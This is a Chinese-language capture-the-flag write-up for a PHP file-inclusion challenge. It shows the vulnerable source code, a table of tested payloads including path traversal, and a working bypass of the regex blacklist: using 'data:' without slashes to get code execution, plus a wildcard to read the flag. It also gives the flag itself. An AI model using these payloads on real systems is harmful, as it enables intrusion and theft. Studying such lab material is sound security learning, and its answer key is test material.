# WP · [qsnctf] 40559 include.php 文件包含 + 黑名单绕过

> 难度：入门偏易（在 40514 data:// 基础上加了过滤）
> 栈：Apache/2.4.38 (Debian) + PHP/7.2.34 → **PHP 题**
> Flag：`flag{b1cc6014eca346ad99739d6a4339e8f3}`

---

## 0. 一眼定性（用之前记的铁律）

响应头 `X-Powered-By: PHP/7.2.34` → 这是 **PHP 题**，往"文件包含 / 反序列化 / 上传"方向想。
URL 叫 `include.php` + 页面用 `highlight_file(__FILE__)` 把源码打印出来 → **文件包含（LFI）** 题，而且源码直接白给。

## 1. 源码（题目自己吐出来的）

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

if(isset($_GET['file'])){
    $file = $_GET['file'];
}
// 假如我增加了过滤，你又该如何应对呢？
if(preg_match('/php:\/\/|file:\/\/|flag|http:\/\/|log|phar:\/\/|data:\/\//i', $file)){
    echo 'No No No !';
}
else{
    include $file;
}
```

核心就一句：`include $_GET['file']`，但 `file` 不能出现这些子串（大小写不限）：
`php://` · `file://` · `flag` · `http://` · `log` · `phar://` · `data://`

这比 40514 那题（裸 `include`，直接 `data://` 秒了）多加了一层正则。

## 2. 测绘黑名单（先确认拦什么）

| 测试 payload | 结果 |
|---|---|
| `php://filter/...` | `No No No !`（拦） |
| `data://text/plain,<?php...?>` | `No No No !`（拦） |
| `php://input` / `php://stdin` | 拦 |
| `flag` 单独 / `flag.php` | 拦 |
| `../../../../etc/hostname` | ✅ 读到了（基础 LFI 通） |
| `expect://` / `ftp://` / `glob://` / `zip://` | 过了过滤但 include 失败（环境没这扩展） |
| `/proc/self/environ` / `/proc/self/fd/0` | 过过滤但读不到（proc 不可读） |

结论：基础本地文件包含能用，但**任何含 `flag` 的路径都被拦**，常见 wrapper 全死，RCE 通道（environ/fd/expect/log）也全死。

## 3. 绕过思路：正则只拦 `data://`，没拦 `data:`

注意正则写的是 `data:\/\/`（**双斜杠**）。但 PHP 的 data wrapper 其实也认 **`data:` 不带 `//`** 的写法，例如：

```
data:text/plain,<?php 代码 ?>
data:;base64,xxxx
```

这两种字符串里**没有 `data://`**，所以正则匹配不到 → 放行；但 PHP 底层仍然按 data wrapper 处理，**把逗号/分号后的内容当文件内容交给 `include` 执行**。

一句话：**WAF 拦的是字面 `data://`，我们换成 `data:`（无双斜杠）就溜过去了。**

## 4. 第二个坑：整个 `$file` 都不能含 `flag`

拿到 RCE 后想读 flag，自然写 `system('cat /flag*')`。但注意——

> 正则检查的是**整个 `$file` 参数**，包括我们塞进去的 PHP 代码字符串。

`data:text/plain,<?php system('cat /flag*');?>` 里明晃晃有 `/flag*` → 含 `flag` → 被拦成 `No No No !`。
改成 **`cat /f*`**（用通配符避开 `flag` 这个子串）→ `$file` 里没 `flag` → 放行，且 `cat /f*` 在服务器上照样匹配到 `/flag` 文件。

## 5. 最终利用链

```
# 先打标记确认能执行 PHP
GET /include.php?file=data:text/plain,<?php echo 'PWNED123';?>
# 回显 PWNED123 ✅ 说明 RCE 成立

# 读 flag（/f* 避开 flag 子串）
GET /include.php?file=data:text/plain,<?php system('cat /f*');?>
# 回显：flag{b1cc6014eca346ad99739d6a4339e8f3}
```

## 6. Flag

```
flag{b1cc6014eca346ad99739d6a4339e8f3}
```

## 7. 这题该记住的两点（通用）

1. **WAF 正则拦的是"字面串"，常漏掉等价写法**。本题 `data://` 被拦，但 `data:`（无 `//`）、大小写/分隔符变形往往能过。看到 `php://` 被拦也别慌，先想"它到底拦的是哪个精确字符串"。
2. **整个被检查的参数都不能出现黑名单词**，连你嵌在里面的命令也得避嫌——用通配符（`/f*`）、变量拼接等方式绕开敏感子串。

> 对比 40514：那题裸 `include`，`data://text/plain,<?php...?>` 直接 RCE；本题加了正则，`data://` 被拦，于是退一步用 `data:`（无 `//`）照样 RCE。两题是亲兄弟。
